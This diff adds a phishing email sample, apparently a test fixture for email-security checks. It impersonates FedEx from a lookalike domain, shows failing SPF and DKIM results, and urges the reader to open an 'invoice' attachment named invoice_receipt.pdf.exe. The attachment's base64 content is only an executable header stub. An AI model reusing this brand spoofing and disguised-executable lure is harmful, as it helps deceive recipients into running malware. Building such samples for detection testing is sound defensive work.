@@ -1,0 +1,25 @@
+From: "FedEx Express" <notifications@fedx-delivery.top>
+To: recipient@example.com
+Subject: Shipment Delivery Exception - Review Attached Invoice
+Date: Wed, 19 Aug 2026 11:30:00 +0000
+Message-ID: <fedx-alert-44@fedx-delivery.top>
+Authentication-Results: spf=fail dkim=fail
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUNDARY_123"
+
+--BOUNDARY_123
+Content-Type: text/plain; charset="utf-8"
+
+Your shipment delivery encountered an exception.
+Please open the attached invoice statement to confirm your address.
+
+FedEx Logistics
+--BOUNDARY_123
+Content-Type: application/octet-stream; name="invoice_receipt.pdf.exe"
+Content-Disposition: attachment; filename="invoice_receipt.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAyAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAAA=
+--BOUNDARY_123--
